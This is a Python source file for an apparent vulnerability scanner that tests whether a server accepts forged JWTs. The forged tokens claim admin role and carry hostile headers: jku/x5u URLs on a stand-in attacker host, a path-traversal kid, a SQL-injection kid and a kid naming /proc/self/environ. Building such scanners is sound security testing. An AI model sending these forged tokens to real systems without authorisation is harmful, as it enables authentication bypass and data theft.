"""JWT key-injection scanner.

Looks for cases where the JWT ``jku`` / ``x5u`` / ``kid`` header points
to attacker-controlled key material:

  * ``jku`` / ``x5u`` URL pointing at an attacker domain
  * ``kid`` header carrying a path traversal payload
  * ``kid`` header carrying a SQL-injection payload
  * ``kid`` header carrying an absolute file path string
"""

from __future__ import annotations

import base64
import json
import logging
from typing import Any, Dict, List, Tuple

from bugwolf.scanners import Finding, Scanner, make_finding


logger = logging.getLogger(__name__)


def _b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _make_jwt(header: Dict[str, Any], payload: Dict[str, Any],
              signature: bytes = b"") -> str:
    h = _b64(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p = _b64(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    s = _b64(signature)
    return f"{h}.{p}.{s}"


_PAYLOAD = {"sub": "victim", "role": "admin"}
_SIG = b"BugWolfKeyInjectionSig"


_TOKENS: Tuple[str, ...] = (
    _make_jwt({"alg": "HS256", "jku": "https://evil.example/keys.json"},
              _PAYLOAD, _SIG),
    _make_jwt({"alg": "HS256", "x5u": "https://evil.example/cert.pem"},
              _PAYLOAD, _SIG),
    _make_jwt({"alg": "HS256",
               "kid": "../../../../../../dev/null"},
              _PAYLOAD, _SIG),
    _make_jwt({"alg": "HS256",
               "kid": "1 OR 1=1 --"},
              _PAYLOAD, _SIG),
    _make_jwt({"alg": "HS256",
               "kid": "/proc/self/environ"},
              _PAYLOAD, _SIG),
)


class JWTKeyInjectionScanner(Scanner):
    name = "jwt-key-injection"
    bug_class = "jwt-key-injection"
    default_severity = "critical"
    PAYLOADS: Tuple[str, ...] = _TOKENS

    def scan(self, target: str, transport) -> List[Finding]:
        if transport is None:
            logger.warning(
                "jwt-key-injection: transport is None; returning []"
            )
            return []
        findings: List[Finding] = []
        for token in self.PAYLOADS:
            try:
                resp: Dict[str, Any] = transport(
                    "GET", target,
                    headers={"Authorization": f"Bearer {token}"},
                )
            except Exception as exc:
                logger.debug("jwt-key: transport error: %s", exc)
                continue
            rbody = (resp.get("body", "") or "").lower()
            if resp.get("status") in (200, 202) and (
                "welcome" in rbody or "dashboard" in rbody
                or "admin" in rbody or "ok" in rbody
            ):
                findings.append(make_finding(
                    self,
                    target=target,
                    evidence="JWT with key-injection header accepted",
                    severity="critical",
                    detail={"token_prefix": token[:24],
                            "status": resp.get("status"),
                            "snippet": rbody[:160]},
                ))
        return findings


__all__ = ["JWTKeyInjectionScanner"]